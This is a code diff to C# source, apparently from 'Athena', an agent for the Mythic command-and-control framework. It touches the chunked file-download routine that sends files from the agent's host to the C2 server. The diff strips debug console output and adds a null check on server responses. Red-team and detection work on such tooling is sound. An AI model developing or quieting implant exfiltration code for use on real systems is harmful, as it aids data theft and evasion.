@@ -107,7 +107,6 @@ namespace Athena
                             //We're on the final chunk
                             if (j.chunk_num == j.total_chunks)
                             {
-                                Console.WriteLine("Done.");
                                 DownloadResponse dr = new DownloadResponse()
                                 {
                                     task_id = job.task.id,
@@ -126,8 +125,6 @@ namespace Athena
                             //Upload next chunk
                             else
                             {
-                                Console.WriteLine("Uploading Next Chunk.");
-                                Console.WriteLine(j.chunk_num);
                                 DownloadResponse dr = new DownloadResponse()
                                 {
                                     task_id = job.task.id,
@@ -211,7 +208,7 @@ namespace Athena
             {
                 var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
                 PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
-                if (cs.responses.Count < 1)
+                if (cs == null || cs.responses.Count < 1)
                 {
                     return false;
                 }
@@ -221,13 +218,11 @@ namespace Athena
                     {
                         if (!String.IsNullOrEmpty(response.file_id))
                         {
-                            Console.WriteLine("[FILE ID]: " + response.file_id);
                             MythicDownloadJob j = Globals.downloadJobs[response.task_id];
                             if (string.IsNullOrEmpty(j.file_id))
                             {
                                 j.file_id = response.file_id;
                                 j.hasoutput = false;
-                                Console.WriteLine("[Update] " + j.file_id);
                             }
                             //Update the file id in the mythic upload tasking
                         }
@@ -236,7 +231,6 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Console.WriteLine("EXCEPTION" + e.Message);
                 return false;
             }
             return true;
